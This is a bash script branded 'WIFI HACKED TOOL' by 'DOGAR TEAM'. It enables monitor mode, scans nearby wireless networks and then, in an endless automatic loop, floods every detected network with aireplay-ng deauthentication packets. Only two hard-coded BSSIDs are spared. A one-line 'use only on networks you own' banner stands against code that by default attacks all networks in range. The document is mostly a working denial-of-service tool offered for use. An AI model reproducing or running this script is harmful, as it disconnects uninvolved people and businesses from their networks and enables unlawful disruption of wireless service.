#!/bin/bash

# Colors for stylish output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Cleanup function to reset WiFi when exiting
cleanup() {
    echo -e "${RED}[!] Cleaning up and resetting WiFi...${NC}"
    
    # Kill all related processes
    echo -e "${YELLOW}[+] Stopping all attack processes...${NC}"
    killall xterm 2>/dev/null
    killall airodump-ng 2>/dev/null
    killall aireplay-ng 2>/dev/null
    
    # Disable monitor mode and return to managed mode
    echo -e "${YELLOW}[+] Disabling monitor mode...${NC}"
    airmon-ng stop wlan0mon 2>/dev/null
    
    # Restart network services
    echo -e "${YELLOW}[+] Restarting network services...${NC}"
    service NetworkManager restart 2>/dev/null
    systemctl restart NetworkManager 2>/dev/null
    
    echo -e "${GREEN}[+] WiFi reset complete. Returning to managed mode.${NC}"
    exit 0
}

# Set trap for Ctrl+C
trap cleanup SIGINT SIGTERM EXIT

# Function to display stylish banner
show_banner() {
    clear
    echo -e "${RED}"
    echo "▓█████▄  ▒█████    ▄████  ▄▄▄       ██▀███  "
    echo "▒██▀ ██▌▒██▒  ██▒ ██▒ ▀█▒▒████▄    ▓██ ▒ ██▒"
    echo "░██   █▌▒██░  ██▒▒██░▄▄▄░▒██  ▀█▄  ▓██ ░▄█ ▒"
    echo "░▓█▄   ▌▒██   ██░░▓█  ██▓░██▄▄▄▄██ ▒██▀▀█▄  "
    echo "░▒████▓ ░ ████▓▒░░▒▓███▀▒ ▓█   ▓██▒░██▓ ▒██▒"
    echo " ▒▒▓  ▒ ░ ▒░▒░▒░  ░▒   ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░"
    echo " ░ ▒  ▒   ░ ▒ ▒░   ░   ░   ▒   ▒▒ ░  ░▒ ░ ▒░"
    echo " ░ ░  ░ ░ ░ ░ ▒  ░ ░   ░   ░   ▒     ░░   ░ "
    echo "   ░        ░ ░        ░       ░  ░   ░     "
    echo -e "${GREEN}▄█     █▄   ██▓  █████▒ ██▓    ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀▓█████ ▓█████▄ "
    echo "▐█▌   ▐█▌ ▓██▒▓██   ▒ ▓██▒   ▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▒██▀ ██▌"
    echo " ██   ██  ▒██▒▒████ ░ ▒██░   ▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███   ░██   █▌"
    echo "  ██ ██   ░██░░▓█▒  ░ ▒██░   ░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ░▓█▄   ▌"
    echo "   ▀█▀    ░██░░▒█░    ░██████░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░▒████▓ "
    echo "          ░▓   ▒ ░    ░ ▒░▓  ░▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░ ▒▒▓  ▒ "
    echo "           ▒ ░ ░      ░ ░ ▒  ░▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░ ░ ▒  ▒ "
    echo "           ▒ ░ ░ ░      ░ ░   ░  ░░ ░  ░   ▒   ░        ░ ░░ ░    ░    ░ ░  ░ "
    echo -e "           ░            ░  ░░  ░  ░      ░  ░░ ░      ░  ░      ░  ░   ░    ${NC}"
    
    echo -e "${CYAN}╔═══════════════════════════ ${RED}[${YELLOW} SYSTEM INFO ${RED}]${CYAN} ═══════════════════════════╗${NC}"
    echo -e "${CYAN}║                                                                    ║${NC}"
    echo -e "${CYAN}║  ${GREEN}▶ Kernel:${NC} $(uname -r) ${PURPLE}|${NC} ${GREEN}OS:${NC} $(grep -m1 PRETTY /etc/os-release | cut -d '"' -f2)    ${CYAN}║${NC}"
    echo -e "${CYAN}║  ${GREEN}▶ Interface:${NC} wlan0 ${PURPLE}|${NC} ${GREEN}Mode:${NC} Monitor                          ${CYAN}║${NC}"
    echo -e "${CYAN}║                                                                    ║${NC}"
    echo -e "${CYAN}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}║${YELLOW}                   WIFI HACKED TOOL VERSION 1.0                    ${CYAN}║${NC}"
    echo -e "${CYAN}║${GREEN}                     CREATED BY DOGAR TEAM                      ${CYAN}║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    
    echo -e "\n${RED}[+]${NC} ${YELLOW}=== Automated WiFi Scanner and Deauth Tool ===${NC}"
    echo -e "${RED}[+]${NC} ${CYAN}=== Use responsibly and only on networks you own ===${NC}"
    echo -e "${RED}[+]${NC} ${PURPLE}=== Press Ctrl+C to exit and reset WiFi ===${NC}"
    
    # Matrix-style animation
    for i in {1..3}; do
        echo -n "${GREEN}"
        for j in {1..70}; do
            r=$((RANDOM % 2))
            if [ $r -eq 0 ]; then
                echo -n "0"
            else
                echo -n "1"
            fi
        done
        echo -e "${NC}"
        sleep 0.1
    done
    echo ""
}

# Check if script is run as root
if [ "$(id -u)" != "0" ]; then
    echo -e "${RED}This script must be run as root${NC}"
    exit 1
fi

# Check if aircrack-ng suite is installed
if ! command -v airmon-ng &> /dev/null; then
    echo -e "${RED}Aircrack-ng suite is not installed. Please install it first.${NC}"
    exit 1
fi

# Check if xterm is installed
if ! command -v xterm &> /dev/null; then
    echo -e "${RED}xterm is not installed. Please install it first.${NC}"
    exit 1
fi

# Function to enable monitor mode
enable_monitor_mode() {
    echo -e "${GREEN}[+] Enabling monitor mode on wlan0...${NC}"
    # Start monitor mode
    airmon-ng start wlan0 > /dev/null
    echo -e "${GREEN}[+] Monitor mode enabled${NC}"
    sleep 1
}

# Function to scan networks with better UI
scan_networks() {
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${RED}                    SCANNING FOR WIRELESS NETWORKS                   ${CYAN}║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    
    # Create temporary files to store scan results
    rm -f /tmp/scan-01.csv
    
    # Run airodump-ng in background without killing it
    xterm -geometry 100x25 -title "AUTO-SCANNING (10s)" -e "airodump-ng -w /tmp/scan --output-format csv wlan0mon & sleep 10" &
    SCAN_XTERM_PID=$!
    
    # Wait exactly 10 seconds for scan to complete with cool progress bar
    echo -e "\n${BLUE}[+] ${YELLOW}Auto-scanning in progress: ${NC}"
    echo -ne "${CYAN}╔"
    for i in {1..68}; do
        echo -ne "═"
    done
    echo -e "╗${NC}"
    echo -ne "${CYAN}║${NC}"
    
    for i in {1..68}; do
        sleep 0.15
        echo -ne "${RED}▓${NC}"
    done
    
    echo -e "${CYAN}║${NC}"
    echo -ne "${CYAN}╚"
    for i in {1..68}; do
        echo -ne "═"
    done
    echo -e "╝${NC}"
    
    echo -e "\n${GREEN}[✓] ${BLUE}Scan completed successfully${NC}"
    
    # Kill the scan window after it's done
    kill -9 $SCAN_XTERM_PID 2>/dev/null
    wait $SCAN_XTERM_PID 2>/dev/null
}

# Define blacklisted BSSIDs that will be skipped during attack
BLACKLIST_BSSIDS=(
    "B4:B0:55:38:63:B4"
    "C8:3A:35:46:1F:70"
)

# Function to check if a BSSID is in the blacklist
is_blacklisted() {
    local check_bssid=$1
    for blacklisted in "${BLACKLIST_BSSIDS[@]}"; do
        if [[ "$check_bssid" == "$blacklisted" ]]; then
            return 0  # True, BSSID is blacklisted
        fi
    done
    return 1  # False, BSSID is not blacklisted
}

# Function to parse scan results with better table display
parse_networks() {
    echo -e "\n${CYAN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${YELLOW}                      NETWORK RECONNAISSANCE                       ${CYAN}║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    
    echo -e "${PURPLE}[+] Parsing scan results...${NC}"
    # Parse CSV to get network information
    NETWORKS=()
    SKIPPED_NETWORKS=()
    
    if [ -f "/tmp/scan-01.csv" ]; then
        # First, count networks to build a better table
        NETWORK_COUNT=0
        SKIPPED_COUNT=0
        
        # Skip header and empty lines, get only BSSIDs
        while IFS=, read -r bssid first_time last_time channel speed privacy cipher authentication power beacons data iv lan_ip id_length essid key; do
            # Skip header lines
            if [[ "$bssid" == "BSSID" || "$bssid" == "Station MAC" || -z "$bssid" ]]; then
                continue
            fi
            
            # Stop at the "Station MAC" line which separates AP and client sections
            if [[ "$bssid" == "Station MAC" ]]; then
                break
            fi
            
            # Clean up values
            bssid=$(echo $bssid | xargs)
            channel=$(echo $channel | xargs)
            essid=$(echo $essid | xargs)
            power=$(echo $power | xargs)
            
            # Skip if no BSSID or empty channel
            if [[ -z "$bssid" || -z "$channel" || "$channel" == "-1" ]]; then
                continue
            fi
            
            # Check if BSSID is in the blacklist
            if is_blacklisted "$bssid"; then
                SKIPPED_NETWORKS+=("$bssid,$channel,$essid,$power")
                SKIPPED_COUNT=$((SKIPPED_COUNT+1))
                continue
            fi
            
            # Add to networks array
            NETWORKS+=("$bssid,$channel,$essid,$power")
            NETWORK_COUNT=$((NETWORK_COUNT+1))
        done < "/tmp/scan-01.csv"
        
        # Display table header
        echo -e "\n${RED}[!] Found ${RED}$NETWORK_COUNT${GREEN} targets to attack and ${YELLOW}$SKIPPED_COUNT${GREEN} skipped!${NC}\n"
        
        if [ $NETWORK_COUNT -gt 0 ]; then
            # Print table header
            echo -e "${CYAN}╔════════════════════════╦════════╦════════╦═══════════════════════════════╦══════════╗${NC}"
            echo -e "${CYAN}║${GREEN}        BSSID         ${CYAN}║${GREEN} CHANNEL ${CYAN}║${GREEN} SIGNAL ${CYAN}║${GREEN}            ESSID            ${CYAN}║${GREEN}  STATUS  ${CYAN}║${NC}"
            echo -e "${CYAN}╠════════════════════════╬════════╬════════╬═══════════════════════════════╬══════════╣${NC}"
            
            # Print each network in table
            for i in "${!NETWORKS[@]}"; do
                IFS=',' read -r bssid channel essid power <<< "${NETWORKS[$i]}"
                
                # Format power into bars for visual representation
                power_abs=${power#-}  # Remove negative sign
                power_bars=""
                
                if [ $power_abs -lt 30 ]; then
                    power_bars="${RED}▓▓▓▓▓${NC}"
                elif [ $power_abs -lt 50 ]; then
                    power_bars="${YELLOW}▓▓▓▓${NC}  "
                elif [ $power_abs -lt 70 ]; then
                    power_bars="${YELLOW}▓▓▓${NC}   "
                else
                    power_bars="${GREEN}▓▓${NC}    "
                fi
                
                # Print table row with network info
                echo -e "${CYAN}║${NC} ${YELLOW}$bssid${NC} ${CYAN}║${NC}   ${GREEN}$channel${NC}    ${CYAN}║${NC} $power_bars ${CYAN}║${NC} ${RED}$essid${NC} ${CYAN}║${NC} ${GREEN}TARGET${NC}   ${CYAN}║${NC}"
            done
            
            # Print skipped networks in table if any
            for i in "${!SKIPPED_NETWORKS[@]}"; do
                IFS=',' read -r bssid channel essid power <<< "${SKIPPED_NETWORKS[$i]}"
                
                # Format power into bars for visual representation
                power_abs=${power#-}  # Remove negative sign
                power_bars=""
                
                if [ $power_abs -lt 30 ]; then
                    power_bars="${RED}▓▓▓▓▓${NC}"
                elif [ $power_abs -lt 50 ]; then
                    power_bars="${YELLOW}▓▓▓▓${NC}  "
                elif [ $power_abs -lt 70 ]; then
                    power_bars="${YELLOW}▓▓▓${NC}   "
                else
                    power_bars="${GREEN}▓▓${NC}    "
                fi
                
                # Print table row with skipped network info
                echo -e "${CYAN}║${NC} ${YELLOW}$bssid${NC} ${CYAN}║${NC}   ${GREEN}$channel${NC}    ${CYAN}║${NC} $power_bars ${CYAN}║${NC} ${RED}$essid${NC} ${CYAN}║${NC} ${YELLOW}SKIPPED${NC} ${CYAN}║${NC}"
            done
            
            # Print table footer
            echo -e "${CYAN}╚════════════════════════╩════════╩════════╩═══════════════════════════════╩══════════╝${NC}"
            
            # Animation for "Starting attack" message
            echo -ne "\n${RED}[!] Initializing attack vectors "
            for i in {1..5}; do
                echo -ne "${RED}▓${NC}"
                sleep 0.2
            done
            echo -e "\n\n${GREEN}[✓] ${RED}ATTACK SEQUENCE ACTIVATED ON ALL TARGETS EXCEPT BLACKLISTED!${NC}\n"
        else
            echo -e "${RED}[!] No attackable networks found. Retrying...${NC}"
            return 1
        fi
    else
        echo -e "${RED}[!] No scan results found. Retrying...${NC}"
        return 1
    fi
}

# Function to attack all networks - Enhanced UI
attack_networks() {
    if [ ${#NETWORKS[@]} -eq 0 ]; then
        echo -e "${RED}[!] No networks to attack${NC}"
        return 1
    fi
    
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${RED}                      LAUNCHING DEAUTH ATTACK                      ${CYAN}║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    
    # First set up monitoring for all networks in one window
    echo -e "${YELLOW}[+] Setting up monitoring for all targets...${NC}"
    
    # Prepare network list for display
    NETWORK_LIST=""
    for network in "${NETWORKS[@]}"; do
        IFS=',' read -r bssid channel essid power <<< "$network"
        NETWORK_LIST="${NETWORK_LIST}${RED}BSSID: ${CYAN}$bssid ${RED}| Channel: ${CYAN}$channel ${RED}| ESSID: ${CYAN}$essid${NC}\n"
    done
    
    # Display target list
    echo -e "${YELLOW}[+] ATTACKING ALL THESE NETWORKS SIMULTANEOUSLY:${NC}"
    echo -e "$NETWORK_LIST"
    
    # Create attack script that will hit ALL networks - simplified for reliability
    echo -e "${RED}[+] INITIALIZING ULTRA-POWERFUL ATTACK SEQUENCE...${NC}"
    
    # Create a simplified but effective attack script
    cat > /tmp/mass_attack.sh << 'EOL'
#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

clear
echo -e "${RED}"
echo "▓█████▄  ▒█████    ▄████  ▄▄▄       ██▀███  "
echo "▒██▀ ██▌▒██▒  ██▒ ██▒ ▀█▒▒████▄    ▓██ ▒ ██▒"
echo "░██   █▌▒██░  ██▒▒██░▄▄▄░▒██  ▀█▄  ▓██ ░▄█ ▒"
echo "░▓█▄   ▌▒██   ██░░▓█  ██▓░██▄▄▄▄██ ▒██▀▀█▄  "
echo "░▒████▓ ░ ████▓▒░░▒▓███▀▒ ▓█   ▓██▒░██▓ ▒██▒"
echo -e "${NC}"

echo -e "${RED}====================================================${NC}"
echo -e "${YELLOW}      MASS DEAUTH ATTACK - MAXIMUM POWER      ${NC}"
echo -e "${GREEN}      TARGETING ALL DETECTED NETWORKS      ${NC}"
echo -e "${RED}====================================================${NC}"
echo ""

# Start monitoring all networks
echo -e "${YELLOW}[+] Starting network monitor...${NC}"
xterm -title "NETWORK MONITOR" -geometry 80x20+0+0 -e "airodump-ng wlan0mon" &
AIRODUMP_PID=$!

# Function to attack one network with ultra-powerful settings
attack_network() {
    local bssid=$1
    local channel=$2
    local essid=$3

    echo -e "${GREEN}[+] Attacking:${NC} $essid (BSSID: $bssid, Channel: $channel)"
    
    # Run a continuous attack loop
    while true; do
        # Maximum power deauth attack
        aireplay-ng --deauth 10000 -a "$bssid" wlan0mon --ignore-negative-one -D &>/dev/null
        
        # Very short delay between attacks
        sleep 0.001
    done
}

# Start the attack countdown
echo -e "${RED}[!] MASS ATTACK BEGINS IN:${NC}"
for i in 3 2 1; do
    echo -e "${RED}$i...${NC}"
    sleep 0.5
done
echo -e "${RED}ATTACK LAUNCHED!${NC}"

# Launch all attack processes
EOL

    # Add all network targets to the attack script
    for network in "${NETWORKS[@]}"; do
        IFS=',' read -r bssid channel essid power <<< "$network"
        echo "attack_network \"$bssid\" \"$channel\" \"$essid\" & # Attack on $essid" >> /tmp/mass_attack.sh
    done
    
    # Add script ending that works reliably
    cat >> /tmp/mass_attack.sh << 'EOL'

# Show attack status with simpler animation
echo -e "\n${RED}[+] ATTACK RUNNING AT MAXIMUM POWER!${NC}"
echo -e "${YELLOW}[+] Sending deauth packets to ALL targets simultaneously${NC}"
echo -e "${GREEN}[+] Window will close after 60 seconds${NC}\n"

# Simple timer animation
for i in {1..60}; do
    echo -ne "\r${RED}Attack running: ${GREEN}$i ${RED}seconds - ["
    for ((j=0; j<i*50/60; j++)); do
        echo -ne "#"
    done
    for ((j=i*50/60; j<50; j++)); do
        echo -ne " "
    done
    echo -ne "] ${YELLOW}$((i*100/60))%${NC}"
    sleep 1
done

echo -e "\n\n${GREEN}[+] Attack cycle completed!${NC}"

# Kill all background processes
killall aireplay-ng &>/dev/null
kill $AIRODUMP_PID &>/dev/null
killall airodump-ng &>/dev/null

echo -e "${GREEN}[+] Done!${NC}"
exit 0
EOL

    # Make script executable
    chmod +x /tmp/mass_attack.sh
    
    # Launch the mass attack script in a more reliable xterm configuration
    xterm -fa 'Monospace' -fs 12 -bg black -fg red -title "DOGAR DEAUTH ATTACK" -geometry 100x30+300+200 -e "/tmp/mass_attack.sh" &
    MASS_ATTACK_PID=$!
    
    # Wait with simpler but effective progress bar
    echo -e "${YELLOW}[+] ULTRA-HYPER-MEGA ATTACK running on ALL networks!${NC}"
    echo -e "${RED}[+] Sending maximum deauth packets to ALL targets!${NC}"
    
    # Show attack progress
    echo -e "\n${CYAN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${RED}                         ATTACK PROGRESS                          ${CYAN}║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    
    for i in {1..60}; do
        bar=$((i*50/60))
        
        # Print progress bar
        echo -ne "\r${GREEN}Progress: ${CYAN}|"
        for ((j=0; j<bar; j++)); do
            echo -ne "${RED}█${NC}"
        done
        
        for ((j=bar; j<50; j++)); do
            echo -ne " "
        done
        
        echo -ne "${CYAN}|${NC} ${PURPLE}$((i*100/60))%${NC} ${GREEN}($i/60 sec)${NC}"
        sleep 1
    done
    
    echo -e "\n\n${GREEN}[✓] Attack cycle completed!${NC}"
    
    # Make sure the attack window is closed
    kill -9 $MASS_ATTACK_PID 2>/dev/null
    wait $MASS_ATTACK_PID 2>/dev/null
    
    # Kill any remaining processes
    killall airodump-ng 2>/dev/null
    killall aireplay-ng 2>/dev/null
    killall mdk4 2>/dev/null
    
    echo -e "\n${GREEN}[+] Moving to next scan cycle...${NC}"
    sleep 2
    return 0
}

# Main loop - Make more automatic
main() {
    show_banner
    
    # Initially enable monitor mode
    echo -e "${RED}[+] AUTOMATIC MODE ACTIVATED${NC}"
    enable_monitor_mode
    
    # Main loop - fully automatic
    while true; do
        echo -e "${YELLOW}[+] BEGINNING AUTOMATIC ATTACK CYCLE${NC}"
        scan_networks
        parse_networks
        attack_networks
        echo -e "${BLUE}[+] Auto-restarting scan cycle...${NC}"
        sleep 2
    done
}

# Start the script
main 